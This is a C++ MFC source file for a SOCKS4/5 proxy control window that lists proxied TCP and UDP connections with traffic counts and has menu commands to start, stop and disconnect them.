#include "stdafx.h"
#include "SocksProxyWnd.h"
#include "SocksProxySrv.h"
#include "SocksProxyAddrDlg.h"
#include "utils.h"

CSocksProxyWnd::CSocksProxyWnd(CSocksProxySrv*pHandler) :
m_pHandler(pHandler),
m_DestroyAfterDisconnect(FALSE)
{
	m_IsRunning = FALSE;
	auto const peer = m_pHandler->GetPeerName();
	m_IP = CA2W(peer.first.c_str());
}


CSocksProxyWnd::~CSocksProxyWnd()
{
}

#define IDC_LIST 2351

BEGIN_MESSAGE_MAP(CSocksProxyWnd, CFrameWnd)
	ON_WM_CREATE()
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_MESSAGE(WM_SOCKS_PROXY_ERROR, OnError)
	ON_MESSAGE(WM_SOCKS_PROXY_UPDATE, OnUpdateList)
	ON_COMMAND(ID_VER_SOCKS4, &CSocksProxyWnd::OnVerSocks4)
	ON_COMMAND(ID_VER_SOCKS5, &CSocksProxyWnd::OnVerSocks5)
	ON_COMMAND(ID_MAIN_STARTPROXY, &CSocksProxyWnd::OnMainStartproxy)
	ON_COMMAND(ID_MAIN_STOP, &CSocksProxyWnd::OnMainStop)
	ON_UPDATE_COMMAND_UI(ID_MAIN_STARTPROXY, &CSocksProxyWnd::OnUpdateMainStartproxy)
	ON_UPDATE_COMMAND_UI(ID_MAIN_STOP, &CSocksProxyWnd::OnUpdateMainStop)
	ON_WM_TIMER()
	ON_NOTIFY(NM_RCLICK, IDC_LIST, &CSocksProxyWnd::OnNMRClickList)
	ON_COMMAND(ID_CONNECTIONS_DISCONNECTALL, &CSocksProxyWnd::OnConnectionsDisconnectall)
	ON_COMMAND(ID_CONNECTIONS_DISCONNECT, &CSocksProxyWnd::OnConnectionsDisconnect)
END_MESSAGE_MAP()

#define SOCKS_PROXY_ID_LOG	100

int CSocksProxyWnd::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;

	CRect rect;
	CString Text;
	m_Menu.LoadMenuW(IDR_SOCKS_PROXY_MENU);
	SetMenu(&m_Menu);
	//

	//默认是Socks5
	CMenu*pMenu = m_Menu.GetSubMenu(1);
	pMenu->CheckMenuRadioItem(ID_VER_SOCKS5, ID_VER_SOCKS4,
		ID_VER_SOCKS5, MF_BYCOMMAND);
	
	GetClientRect(&rect);
	
	if (!m_Connections.Create(WS_CHILD | WS_VISIBLE | WS_BORDER | LVS_REPORT,
		rect, this, IDC_LIST))
	{
		TRACE0("未能创建ClientList\n");
		return -1;      // 未能创建
	}

	DWORD dwExStyle = m_Connections.GetExStyle();
	m_Connections.ModifyStyle(LVS_SINGLESEL, 0);
	dwExStyle |= LVS_EX_GRIDLINES | LVS_EX_FULLROWSELECT | LVS_EX_AUTOCHECKSELECT | LVS_EX_CHECKBOXES;
	m_Connections.SetExtendedStyle(dwExStyle);
	
	//左对齐
	m_Connections.InsertColumn(0, L"Type", LVCFMT_LEFT, 80);
	m_Connections.InsertColumn(1, L"Source", LVCFMT_LEFT, 180);				//OK
	m_Connections.InsertColumn(2, L"Remote/UDP Relay", LVCFMT_LEFT, 230);				//OK
	m_Connections.InsertColumn(3, L"Upload", LVCFMT_LEFT, 100);				//OK
	m_Connections.InsertColumn(4, L"Download", LVCFMT_LEFT, 110);			//OK
	m_Connections.InsertColumn(5, L"Time", LVCFMT_LEFT, 230);				//--


	Text.Format(TEXT("[%s] SocksProxy"), m_IP.GetBuffer());
	SetWindowText(Text);
	//
	GetWindowRect(rect);
	rect.right = rect.left + 980;
	rect.bottom = rect.top + 460;
	MoveWindow(rect);
	return 0;
}

void CSocksProxyWnd::OnNMRClickList(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO:  在此添加控件通知处理程序代码
	*pResult = 0;


	CMenu*pMenu = GetMenu()->GetSubMenu(2);
	POINT pt;
	GetCursorPos(&pt);
	pMenu->TrackPopupMenu(TPM_LEFTALIGN, pt.x, pt.y, this);	//阻塞.
}

LRESULT CSocksProxyWnd::OnUpdateList(WPARAM wParam, LPARAM lParam){
	LVFINDINFO info = { 0 };
	ConInfo * pConInfo;
	FlowInfo*pFlowInfo;

	int nIndex;

	switch (wParam)
	{
	case UPDATE_ADDCON:
		do{
			nIndex = m_Connections.GetItemCount();
			pConInfo = (ConInfo*)lParam;
			if (pConInfo->m_type == 0x0){
				m_Connections.InsertItem(nIndex, TEXT("TCP"));
			}
			else if (pConInfo->m_type == 0x1){
				m_Connections.InsertItem(nIndex, TEXT("UDP"));
			}

			CString Source(pConInfo->m_Source);
			CString Remote(pConInfo->m_Remote);
			CString Time = CTime(CTime::GetCurrentTime()).Format(TEXT("%Y-%m-%d %H:%M:%S"));

			m_Connections.SetItemText(nIndex, 1, Source);
			m_Connections.SetItemText(nIndex, 2, Remote);
			m_Connections.SetItemText(nIndex, 3, TEXT(""));
			m_Connections.SetItemText(nIndex, 4, TEXT(""));
			m_Connections.SetItemText(nIndex, 5, Time);

			m_Connections.SetItemData(nIndex, pConInfo->m_ClientID);
		} while (0);
		break;
	case UPDATE_DELCON:
		info.flags = LVFI_PARAM;
		info.lParam = lParam;		//Client ID;
		if ((nIndex = m_Connections.FindItem(&info)) >= 0){
			m_Connections.DeleteItem(nIndex);
		}
		break;
	case UPDATE_UPLOAD:
		pFlowInfo = (FlowInfo*)lParam;
		info.flags = LVFI_PARAM;
		info.lParam = pFlowInfo->ClientID;		//Client ID;
		if ((nIndex = m_Connections.FindItem(&info)) >= 0){
			TCHAR  strFlow[64] = { 0 };
			GetStorageSizeString(pFlowInfo->liFlow, strFlow);
			m_Connections.SetItemText(nIndex, 3, strFlow);
		}
		break;
	case UPDATE_DOWNLOAD:
		pFlowInfo = (FlowInfo*)lParam;
		info.flags = LVFI_PARAM;
		info.lParam = pFlowInfo->ClientID;		//Client ID;
		if ((nIndex = m_Connections.FindItem(&info)) >= 0){
			TCHAR  strFlow[64] = { 0 };
			GetStorageSizeString(pFlowInfo->liFlow, strFlow);
			m_Connections.SetItemText(nIndex, 4, strFlow);
		}
		break;
	}
	return 0;
}


LRESULT CSocksProxyWnd::OnError(WPARAM wParam, LPARAM lParam){
	TCHAR* szError = (TCHAR*)wParam;
	MessageBox(szError, TEXT("Tips"), MB_OK | MB_ICONINFORMATION);
	return 0;
}

void CSocksProxyWnd::OnClose()
{
	// TODO:  在此添加消息处理程序代码和/或调用默认值
	if (m_pHandler){
		m_DestroyAfterDisconnect = TRUE;
		m_pHandler->Close();
	}
	else{
		//m_pHandler已经没了,现在只管自己就行.
		DestroyWindow();
	}
}


void CSocksProxyWnd::PostNcDestroy()
{
	if (!m_DestroyAfterDisconnect){
		delete this;
	}
}


void CSocksProxyWnd::OnSize(UINT nType, int cx, int cy)
{
	CFrameWnd::OnSize(nType, cx, cy);
	RECT rect;

	if (m_hWnd && m_Connections.m_hWnd){	
		GetClientRect(&rect);
		m_Connections.MoveWindow(&rect);
	}
}


void CSocksProxyWnd::OnVerSocks4()
{
	if (m_pHandler){
		m_pHandler->SetSocksVersion(0x4);

		GetMenu()->GetSubMenu(1)->
			CheckMenuRadioItem(ID_VER_SOCKS5, ID_VER_SOCKS4,
			ID_VER_SOCKS4, MF_BYCOMMAND);
	}
}


void CSocksProxyWnd::OnVerSocks5()
{
	if (m_pHandler){
		m_pHandler->SetSocksVersion(0x5);

		GetMenu()->GetSubMenu(1)->
			CheckMenuRadioItem(ID_VER_SOCKS5, ID_VER_SOCKS4,
			ID_VER_SOCKS5, MF_BYCOMMAND);
	}
}


void CSocksProxyWnd::OnMainStartproxy()
{
	CSocksProxyAddrDlg dlg;
	if (dlg.DoModal() == IDOK){

		DWORD Addr = dlg.m_Addr;
		DWORD Port = dlg.m_Port;
		DWORD UdpAssociateAddr = dlg.m_UDPAssociateAddress;

		if (m_pHandler){
			if (m_pHandler->StartProxyServer(Port, Addr, UdpAssociateAddr)){
				MessageBox(TEXT("Start Proxy Server Success!"),
					TEXT("Tips"), MB_OK | MB_ICONINFORMATION);
				in_addr addr;
				addr.S_un.S_addr = ntohl(Addr);
				m_IsRunning = TRUE;
				m_BindPort = Port;
				m_BindAddress = CA2W(inet_ntoa(addr));
				SetTimer(10086, 1000, 0);
				return;
			}
		}

		MessageBox(TEXT("Start Proxy Server Failed!"),
			TEXT("Tips"), MB_OK | MB_ICONINFORMATION);
	}
}


void CSocksProxyWnd::OnMainStop()
{
	if (m_IsRunning){
		if (m_pHandler){
			m_pHandler->StopProxyServer();
			MessageBox(TEXT("Proxy server has been stopped!"),
				TEXT("Tips"), MB_OK | MB_ICONINFORMATION);

			CString Text;
			Text.Format(TEXT("[%s] SocksProxy"), m_IP.GetBuffer());
			SetWindowText(Text);

			m_IsRunning = FALSE;
			KillTimer(10086);
		}
	}
}


void CSocksProxyWnd::OnUpdateMainStartproxy(CCmdUI *pCmdUI)
{
	pCmdUI->Enable(!m_IsRunning);
}


void CSocksProxyWnd::OnUpdateMainStop(CCmdUI *pCmdUI)
{
	pCmdUI->Enable(m_IsRunning);
}


void CSocksProxyWnd::OnTimer(UINT_PTR nIDEvent)
{
	// TODO:  在此添加消息处理程序代码和/或调用默认值
	if (m_pHandler){
		CString Text;
		DWORD Connections = m_pHandler->GetConnections();
		Text.Format(TEXT("[%s] SocksProxy - Listen: %s.%d Connections:%d"),
			m_IP.GetBuffer(), m_BindAddress.GetBuffer(),
			m_BindPort,Connections);

		SetWindowText(Text);
	}
	CFrameWnd::OnTimer(nIDEvent);
}



void CSocksProxyWnd::OnConnectionsDisconnectall()
{
	for (int i = 0; i < m_Connections.GetItemCount(); i++){
		int ClientId = m_Connections.GetItemData(i);
		if (m_pHandler){
			m_pHandler->Disconnect(ClientId);
		}
	}
}


void CSocksProxyWnd::OnConnectionsDisconnect()
{
	POSITION pos = m_Connections.GetFirstSelectedItemPosition();
	while (pos){
		int index = m_Connections.GetNextSelectedItem(pos);
		int ClientId = m_Connections.GetItemData(index);
		if (m_pHandler){
			m_pHandler->Disconnect(ClientId);
		}
	}
}
